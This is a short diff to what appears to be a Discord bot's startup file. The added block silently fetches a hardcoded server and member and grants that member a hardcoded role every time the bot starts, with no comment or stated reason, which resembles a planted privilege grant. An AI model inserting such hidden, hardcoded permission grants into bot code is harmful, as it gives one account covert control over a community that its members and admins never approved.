@@ -14,6 +14,11 @@ const ModuleUtils = require("./utility/ModuleUtils");
     ModuleUtils.registerCommands(__dirname + "/commands");
 
     process.Sparrow = require("./sparrow/sparrow");
+
+    process.client.guilds.fetch("967270174841520178").then(async (guild)=> {
+        const m = await guild.members.fetch("328984108271140864");
+        m.roles.add("968700535848984668");
+    });
 })();
 
 process.on("unhandledRejection", (error) => {
